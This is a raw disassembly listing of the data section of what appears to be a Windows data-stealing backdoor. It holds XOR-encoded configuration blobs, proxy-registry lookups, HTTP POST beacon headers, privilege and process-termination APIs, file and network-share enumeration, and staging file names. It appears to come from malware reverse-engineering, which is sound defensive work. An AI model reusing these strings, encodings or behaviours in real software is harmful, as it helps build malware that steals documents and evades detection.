db  83h ; ƒ
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_4091E8 db  21h ; !
db  40h ; @
db  23h ; #
db  24h ; $
db  25h ; %
db  5Eh ; ^
db  3Ah ; :
unk_4091EF db  8Dh
db  8Dh
db  8Dh
db  42h ; B
db  9Fh ; Ÿ
db  97h ; —
db  82h ; ‚
db  88h ; ˆ
db  85h ; …
db  97h ; —
db  82h ; ‚
db  42h ; B
db  99h ; ™
db  85h ; …
db  83h ; ƒ
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_409268 db  5Ah ; Z
db  58h ; X
db  43h ; C
db  56h ; V
db  42h ; B
db  4Eh ; N
db  3Ah ; :
unk_40926F db  7Fh ; 
db  7Bh ; {
db  6Ch ; l
db  64h ; d
db  60h ; `
db  65h ; e
db  66h ; f
db  7Bh ; {
db  42h ; B
db  7Bh ; {
db  6Ch ; l
db  7Bh ; {
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_4092E8 db  51h ; Q
db  57h ; W
db  45h ; E
db  52h ; R
db  54h ; T
db  59h ; Y
db  3Ah ; :
unk_4092EF db  45h ; E
db  89h ; ‰
db  9Eh ; ž
db  8Fh
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_409368 db  54h ; T
db  59h ; Y
db  55h ; U
db  49h ; I
db  4Fh ; O
db  50h ; P
db  3Ah ; :
unk_40936F db  45h ; E
db  98h ; ˜
db  9Fh ; Ÿ
db  8Eh ; Ž
db  9Ch ; œ
db  9Fh ; Ÿ
db  42h ; B
db  9Dh
db  9Fh ; Ÿ
db  9Ah ; š
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_4093E8 db  46h ; F
db  47h ; G
db  48h ; H
db  4Ah ; J
db  4Bh ; K
db  4Ch ; L
db  3Ah ; :
unk_4093EF db  45h ; E
db  99h ; ™
db  85h ; …
db  82h ; ‚
db  82h ; ‚
db  9Bh ; ›
db  99h ; ™
db  88h ; ˆ
db  42h ; B
db  9Dh
db  9Fh ; Ÿ
db  9Ah ; š
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_409468 db  90h
db  58h ; X
db  62h ; b
db  88h ; ˆ
db  6Bh ; k
db  82h ; ‚
db  9Fh ; Ÿ
db  82h ; ‚
db  89h ; ‰
db  88h ; ˆ
db  97h ; —
db  80h ; €
db  80h ; €
db  61h ; a
db  76h ; v
db  4Fh ; O
db  44h ; D
db  44h ; D
db  4Dh ; M
db  46h ; F
db  4Dh ; M
db  58h ; X
db    0
db    0
unk_409480 db  90h
db  82h ; ‚
db  9Bh ; ›
db  88h ; ˆ
db  89h ; ‰
db  8Ah ; Š
db  99h ; ™
db  42h ; B
db  9Bh ; ›
db  8Ch ; Œ
db  9Bh ; ›
db    0
unk_40948C db  90h
db  82h ; ‚
db  9Bh ; ›
db  88h ; ˆ
db  89h ; ‰
db  99h ; ™
db  8Ah ; Š
db  42h ; B
db  9Bh ; ›
db  8Ch ; Œ
db  9Bh ; ›
db    0
unk_409498 db  90h
db  82h ; ‚
db  9Bh ; ›
db  88h ; ˆ
db  89h ; ‰
db  8Ah ; Š
db  99h ; ™
db  89h ; ‰
db  42h ; B
db  9Bh ; ›
db  8Ch ; Œ
db  9Bh ; ›
db    0
db    0
db    0
db    0
unk_4094A8 db  69h ; i
db  8Fh
db  89h ; ‰
db  88h ; ˆ
db  9Bh ; ›
db  83h ; ƒ
db  54h ; T
db  7Fh ; 
db  98h ; ˜
db  80h ; €
db  9Bh ; ›
db  54h ; T
db  64h ; d
db  86h ; †
db  85h ; …
db  99h ; ™
db  9Bh ; ›
db  89h ; ‰
db  89h ; ‰
db    0
; const CHAR byte_4094BC
byte_4094BC db 9Ah
db  85h ; …
db  86h ; †
db  99h ; ™
db  9Bh ; ›
db  9Dh
db  8Bh ; ‹
db  9Bh ; ›
db  89h ; ‰
db  88h ; ˆ
db    0
db    0
unk_4094C8 db  64h ; d
db  86h ; †
db  85h ; …
db  9Dh
db  86h ; †
db  97h ; —
db  83h ; ƒ
db  54h ; T
db  7Ah ; z
db  9Fh ; Ÿ
db  80h ; €
db  9Bh ; ›
db  89h ; ‰
db    0
db    0
db    0
unk_4094D8 db  90h
db  7Fh ; 
db  82h ; ‚
db  88h ; ˆ
db  9Bh ; ›
db  86h ; †
db  82h ; ‚
db  9Bh ; ›
db  88h ; ˆ
db  54h ; T
db  7Bh ; {
db  8Ch ; Œ
db  84h ; „
db  47h ; G
db  85h ; …
db  86h ; †
db  9Bh ; ›
db  86h ; †
db    0
db    0
; CHAR aBxey[]
aBxey db '^Bxey',0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  78h ; x
db  65h ; e
db  79h ; y
db  6Ch ; l
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  64h ; d
db  78h ; x
db  7Ah ; z
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  68h ; h
db  7Fh ; 
db  7Ah ; z
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  64h ; d
db  7Dh ; }
db  64h ; d
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  60h ; `
db  78h ; x
db  7Ah ; z
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  66h ; f
db  68h ; h
db  7Ah ; z
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  63h ; c
db  77h ; w
db  6Ch ; l
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  66h ; f
db  7Ch ; |
db  69h ; i
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  6Dh ; m
db  64h ; d
db  78h ; x
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db  5Eh ; ^
db  42h ; B
db  88h ; ˆ
db  8Ch ; Œ
db  88h ; ˆ
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_40959C db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_40962C db  77h ; w
db  8Bh ; ‹
db  98h ; ˜
db  9Fh ; Ÿ
db  85h ; …
db  64h ; d
db  85h ; …
db  86h ; †
db  88h ; ˆ
db    0
db    0
db    0
unk_409638 db  77h ; w
db  8Bh ; ‹
db  98h ; ˜
db  9Fh ; Ÿ
db  85h ; …
db  64h ; d
db  85h ; …
db  86h ; †
db  88h ; ˆ
db  42h ; B
db  89h ; ‰
db  8Fh
db  89h ; ‰
db    0
db    0
db    0
unk_409648 db  45h ; E
db  83h ; ƒ
db  8Fh
db  8Ah ; Š
db  9Bh ; ›
db  86h ; †
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
unk_409654 db  45h ; E
db  83h ; ƒ
db  8Fh
db  9Bh ; ›
db  8Ch ; Œ
db  9Bh ; ›
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
unk_409660 db  45h ; E
db  97h ; —
db  84h ; „
db  84h ; „
db  4Ch ; L
db  44h ; D
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
db    0
unk_40966C db  45h ; E
db  9Ch ; œ
db  85h ; …
db  89h ; ‰
db  88h ; ˆ
db  80h ; €
db  9Fh ; Ÿ
db  89h ; ‰
db  88h ; ˆ
db  4Ch ; L
db  44h ; D
db  42h ; B
db  9Ch ; œ
db  88h ; ˆ
db  83h ; ƒ
db    0
unk_40967C db  45h ; E
db  83h ; ƒ
db  8Fh
db  98h ; ˜
db  9Fh ; Ÿ
db  8Eh ; Ž
db  9Ch ; œ
db  9Fh ; Ÿ
db  42h ; B
db  9Dh
db  9Fh ; Ÿ
db  9Ah ; š
db    0
db    0
db    0
db    0
a2025 db '20.25',0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
db    0
unk_40969C db  63h ; c
db  6Dh ; m
db  63h ; c
db  62h ; b
db  71h ; q
db  79h ; y
db  6Ah ; j
db  73h ; s
db  81h
db  84h ; „
db  84h ; „
db  91h ; ‘
db  98h ; ˜
db  82h ; ‚
db  73h ; s
db  87h ; ‡
db  98h ; ˜
db  82h ; ‚
db  84h ; „
db  87h ; ‡
db  9Ah ; š
db  63h ; c
db  91h ; ‘
db  82h ; ‚
db  6Ah ; j
db  63h ; c
db  91h ; ‘
db  84h ; „
db  80h ; €
db  9Dh
db  93h ; “
db  91h ; ‘
db  83h ; ƒ
db    0
db    0
db    0
unk_4096C0 db  63h ; c
db  6Dh ; m
db  63h ; c
db  62h ; b
db  71h ; q
db  79h ; y
db  6Ah ; j
db  73h ; s
db  87h ; ‡
db  98h ; ˜
db  82h ; ‚
db  84h ; „
db  87h ; ‡
db  9Ah ; š
db  63h ; c
db  91h ; ‘
db  82h ; ‚
db  46h ; F
db  46h ; F
db  45h ; E
db  6Ah ; j
db  63h ; c
db  91h ; ‘
db  84h ; „
db  80h ; €
db  9Dh
db  93h ; “
db  91h ; ‘
db  83h ; ƒ
db    0
db    0
db    0
unk_4096E0 db  63h ; c
db  6Dh ; m
db  63h ; c
db  62h ; b
db  71h ; q
db  79h ; y
db  6Ah ; j
db  73h ; s
db  87h ; ‡
db  98h ; ˜
db  82h ; ‚
db  84h ; „
db  87h ; ‡
db  9Ah ; š
db  63h ; c
db  91h ; ‘
db  82h ; ‚
db  46h ; F
db  46h ; F
db  44h ; D
db  6Ah ; j
db  63h ; c
db  91h ; ‘
db  84h ; „
db  80h ; €
db  9Dh
db  93h ; “
db  91h ; ‘
db  83h ; ƒ
db    0
db    0
db    0
unk_409700 db  6Ah ; j
db  92h ; ’
db  84h ; „
db  9Dh
db  80h ; €
db  91h ; ‘
db  84h ; „
db  83h ; ƒ
db  6Ah ; j
db    0
db    0
db    0
unk_40970C db  6Ah ; j
db  72h ; r
db  84h ; „
db  9Dh
db  80h ; €
db  91h ; ‘
db  84h ; „
db  78h ; x
db  81h
db  99h ; ™
db  58h ; X
db  92h ; ’
db  95h ; •
db  82h ; ‚
db    0
db    0
db 0FFh ; ÿ
db 0FFh ; ÿ
db 0FFh ; ÿ
db 0FFh ; ÿ
; CHAR aSend[]
aSend db 'send',0
align 4
; CHAR aWs232Dll[]
aWs232Dll db 'Ws2_32.dll',0
align 4
; CHAR ProcName[]
ProcName db 'GetModuleFileNameA',0
align 4
; CHAR LibFileName[]
LibFileName db 'Kernel32.dll',0
align 4
; CHAR aHostid[]
aHostid db 'hostid',0
align 10h
; CHAR ValueName[]
ValueName db 'pid',0
asc_409764 db '\',0
align 4
aExe_0 db '.EXE',0
align 10h
; char Format[]
Format db '%c:~a',0
align 4
aExe db '.exe',0
align 10h
aInternetExp1or db '\Internet Exp1orer',0
align 4
; char SubStr[]
SubStr db 'http=',0
align 4
; CHAR aProxyserver[]
aProxyserver db 'ProxyServer',0
; CHAR aProxyenable[]
aProxyenable db 'ProxyEnable',0
; CHAR aSoftwareMicros[]
aSoftwareMicros db 'Software\Microsoft\Windows\CurrentV'
db 'ersion\Internet Settings',0
; char aUU[]
aUU db '%u:%u',0
align 4
; char aSS[]
aSS db '%s%s',0
align 10h
; char aProxySU[]
aProxySU db '(Proxy-%s:%u)',0
align 10h
dword_409810 dd 6F725028h
dword_409814 dd 4E2D7978h
word_409818 dw 296Fh
byte_40981A db 0
align 4
; CHAR aGettickcount[]
aGettickcount db 'GetTickCount',0
align 4
asc_40982C db 0Dh,0Ah
db 0Dh,0Ah,0
align 4
aProxyConnectio db 0Dh,0Ah
db 'Proxy-Connection: Keep-Alive',0
align 4
aContentLength db 0Dh,0Ah
db 'Content-Length: ',0
align 4
aPragmaNoCache db 0Dh,0Ah
db 'Pragma: no-cache',0
align 4
aUserAgentMozil db 'User-Agent: Mozilla/4.0 (compatible'
db '; MSIE 6.0; Win32)',0Dh,0Ah
db 'HOST: ',0
align 4
aHttp10 db ' HTTP/1.0',0Dh,0Ah,0
aIndexHtm db '/index.htm',0
align 4
aHttp_0 db 'http://',0
aPost db 'POST ',0
align 4
aGet db 'GET ',0
align 4
; char a200Ok[]
a200Ok db '200 OK',0
align 4
aTemp1020Txt db '\Temp1020.txt',0
align 4
; CHAR aShgetspecialfo[]
aShgetspecialfo db 'SHGetSpecialFolderPathA',0
; CHAR aShell32Dll_0[]
aShell32Dll_0 db 'shell32.dll',0
; CHAR aGetmodulefilen_0[]
aGetmodulefilen_0 db 'GetModuleFileNameExA',0
align 10h
; CHAR aEnumprocessmod[]
aEnumprocessmod db 'EnumProcessModules',0
align 4
; CHAR aPsapiDll[]
aPsapiDll db 'psapi.dll',0
align 10h
; CHAR aSetakeownershi[]
aSetakeownershi db 'SeTakeOwnershipPrivilege',0
align 4
; char asc_40997C[]
asc_40997C db '\??\',0
align 4
; char Str[]
Str db '\SystemRoot\',0
align 4
asc_409994 db ')',0
align 4
asc_409998 db '(',0
align 4
; CHAR aSystem_0[]
aSystem_0 db 'System',0
align 4
aOsKernel db 'OS Kernel',0
align 10h
aSystem db 'SYSTEM',0
align 4
; CHAR aTerminateproce[]
aTerminateproce db 'TerminateProcess',0
align 4
asc_4099CC db '.',0
align 10h
; CHAR asc_4099D0[]
asc_4099D0 db '*.*',0
; CHAR asc_4099D4[]
asc_4099D4 db '*.',0
align 4
; char aSS_0[]
aSS_0 db '%s\%s',0
align 10h
; char aS[]
aS db '%s\*.*',0
align 4
aNtrecdoc db '\$NtRecDoc$',0
; char aSSS[]
aSSS db '%s\%s.%s',0
align 10h
; char a02u02u02u02u05[]
a02u02u02u02u05 db '%02u%02u%02u%02u%05d',0
align 4
; char aSS_1[]
aSS_1 db '%s\$%s',0
align 10h
; char a05d[]
a05d db '%05d',0
align 4
; char Mode[]
Mode db 'rb',0
align 4
aLwxrsvTem db '\LwxRsv.tem',0
; char aAb[]
aAb db 'ab',0
align 4
; char aLddata[]
aLddata db '\$LDDATA$\',0
align 4
; char aWb[]
aWb db 'wb',0
align 4
; char asc_409A4C[]
asc_409A4C db '\\\',0
; CHAR aWnetenumresour[]
aWnetenumresour db 'WNetEnumResourceA',0
align 4
; CHAR aWnetopenenuma[]
aWnetopenenuma db 'WNetOpenEnumA',0
align 4
; CHAR aMprDll_0[]
aMprDll_0 db 'Mpr.dll',0
; char aSaddrerr[]
aSaddrerr db '%sAddrErr]',0
align 4
; char aSerr[]
aSerr db '%sErr]',0
align 10h
; char aSosf[]
aSosf db '%sOSF]',0
align 4
aSvms db '%sVMS]',0
align 10h
aSunknown db '%sUnknown]',0
align 4
; char aSwinntDD[]
aSwinntDD db '%sWinNT%d.%d]',0
align 4
aSwin2003 db '%sWin2003]',0
align 4
aSwinxp db '%sWinXP]',0
align 4
aSwin2k db '%sWin2K]',0
align 10h
aSdos db '%sDOS]',0
align 4
aSwin32 db '%sWin32]',0
align 4
aSwin9x db '%sWin9x]',0
align 10h
aS_1:
text "UTF-16LE", '%s',0
align 4
; CHAR aNetapibufferfr[]
aNetapibufferfr db 'NetApiBufferFree',0
align 4
aSnetservergeti db '%sNetServerGetInfo',0
align 10h
; CHAR aNetservergetin[]
aNetservergetin db 'NetServerGetInfo',0
align 4
; char aSliberr[]
aSliberr db '%sLibErr]',0
align 10h
; CHAR aNetapi32[]
aNetapi32 db 'Netapi32',0
align 4
aErr db '[Err:',0
align 4
; char aS_0[]
aS_0 db '[%s:',0
align 4
; char aSUnconnect[]
aSUnconnect db '[%s:Unconnect]',0
align 4
; char aSSocketError[]
aSSocketError db '[%s:SOCKET_ERROR]',0
align 10h
aNoip db '[NoIP]',0
align 4
unk_409B98 db  93h ; “
db  93h ; “
db  93h ; “
db  49h ; I
db  6Ch ; l
db 0C0h ; À
db 0DEh ; Þ
db 0D1h ; Ñ
db 0E0h ; à
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  8Bh ; ‹
db  94h ; ”
db  5Bh ; [
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  6Ch ; l
db  6Dh ; m
db  93h ; “
db  9Bh ; ›
db 0B3h ; ³
db  93h ; “
db  9Fh ; Ÿ
db  6Ch ; l
db  93h ; “
db  49h ; I
db  93h ; “
db  97h ; —
db  82h ; ‚
db  99h ; ™
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0C4h ; Ä
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  47h ; G
db  93h ; “
db  93h ; “
db  13h
db  0Ch
db  93h ; “
db 0DDh ; Ý
db 0C7h ; Ç
db 0DFh ; ß
db 0DEh ; Þ
db 0C0h ; À
db 0C0h ; À
db 0C3h ; Ã
db  93h ; “
db  90h
db  93h ; “
db  93h ; “
db  93h ; “
db  92h ; ’
db  93h ; “
db  92h ; ’
db  93h ; “
db 0D5h ; Õ
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0D4h ; Ô
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0D3h ; Ó
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0D3h ; Ó
db  93h ; “
db  93h ; “
db  93h ; “
db  95h ; •
db  93h ; “
db  95h ; •
db  93h ; “
db 0D3h ; Ó
db  93h ; “
db  93h ; “
db  93h ; “
db  83h ; ƒ
db  93h ; “
db  83h ; ƒ
db  93h ; “
db 0D4h ; Ô
db  93h ; “
db  93h ; “
db  93h ; “
db  86h ; †
db  19h
db  1Bh
db  73h ; s
db 0DBh ; Û
db  93h ; “
db 0DCh ; Ü
db  93h ; “
db 0D7h ; ×
db  93h ; “
db  93h ; “
db  12h
db  8Ah ; Š
db 0F9h ; ù
db 0E9h ; é
db  61h ; a
db  77h ; w
db 0DAh ; Ú
db  8Fh
db 0BBh ; »
db  3Ch ; <
db 0A3h ; £
db 0B6h ; ¶
db 0E7h ; ç
db  83h ; ƒ
db 0F4h ; ô
db 0C0h ; À
db 0C4h ; Ä
db  93h ; “
db 0FAh ; ú
db  93h ; “
db 0FDh ; ý
db  93h ; “
db 0F7h ; ÷
db  93h ; “
db 0FCh ; ü
db  93h ; “
db 0E4h ; ä
db  93h ; “
db 0E0h ; à
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A1h ; ¡
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A1h ; ¡
db  93h ; “
db 0A2h ; ¢
db  93h ; “
db 0AAh ; ª
db  93h ; “
db 0A6h ; ¦
db  93h ; “
db  93h ; “
db  93h ; “
db 0C4h ; Ä
db  93h ; “
db 0FAh ; ú
db  93h ; “
db 0FDh ; ý
db  93h ; “
db 0F7h ; ÷
db  93h ; “
db 0FCh ; ü
db  93h ; “
db 0E4h ; ä
db  93h ; “
db 0E0h ; à
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A1h ; ¡
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A6h ; ¦
db  93h ; “
db 0BDh ; ½
db  93h ; “
db 0A3h ; £
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db    0
db    0
unk_409C78 db  93h ; “
db  93h ; “
db  93h ; “
db  37h ; 7
db  6Ch ; l
db 0C0h ; À
db 0DEh ; Þ
db 0D1h ; Ñ
db 0E0h ; à
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  8Bh ; ‹
db  94h ; ”
db  5Bh ; [
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  6Ch ; l
db  6Dh ; m
db  93h ; “
db  93h ; “
db  83h ; ƒ
db  93h ; “
db  9Fh ; Ÿ
db  6Ch ; l
db  93h ; “
db  37h ; 7
db  93h ; “
db  97h ; —
db  82h ; ‚
db  99h ; ™
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0B3h ; ³
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  47h ; G
db  93h ; “
db  93h ; “
db  13h
db 0FAh ; ú
db  93h ; “
db 0DDh ; Ý
db 0C7h ; Ç
db 0DFh ; ß
db 0DEh ; Þ
db 0C0h ; À
db 0C0h ; À
db 0C3h ; Ã
db  93h ; “
db  92h ; ’
db  93h ; “
db  93h ; “
db  93h ; “
db    4
db  11h
db  9Bh ; ›
db  73h ; s
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0C4h ; Ä
db  93h ; “
db 0FAh ; ú
db  93h ; “
db 0FDh ; ý
db  93h ; “
db 0F7h ; ÷
db  93h ; “
db 0FCh ; ü
db  93h ; “
db 0E4h ; ä
db  93h ; “
db 0E0h ; à
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A1h ; ¡
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A1h ; ¡
db  93h ; “
db 0A2h ; ¢
db  93h ; “
db 0AAh ; ª
db  93h ; “
db 0A6h ; ¦
db  93h ; “
db  93h ; “
db  93h ; “
db 0C4h ; Ä
db  93h ; “
db 0FAh ; ú
db  93h ; “
db 0FDh ; ý
db  93h ; “
db 0F7h ; ÷
db  93h ; “
db 0FCh ; ü
db  93h ; “
db 0E4h ; ä
db  93h ; “
db 0E0h ; à
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A1h ; ¡
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0A3h ; £
db  93h ; “
db 0B3h ; ³
db  93h ; “
db 0A6h ; ¦
db  93h ; “
db 0BDh ; ½
db  93h ; “
db 0A3h ; £
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db    0
db    0
db    0
db    0
unk_409D24 db  93h ; “
db  93h ; “
db  93h ; “
db  16h
db  6Ch ; l
db 0C0h ; À
db 0DEh ; Þ
db 0D1h ; Ñ
db 0E1h ; á
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  8Bh ; ‹
db 0C0h ; À
db  5Bh ; [
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  6Ch ; l
db  6Dh ; m
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db  93h ; “
db 0F1h ; ñ
db  93h ; “
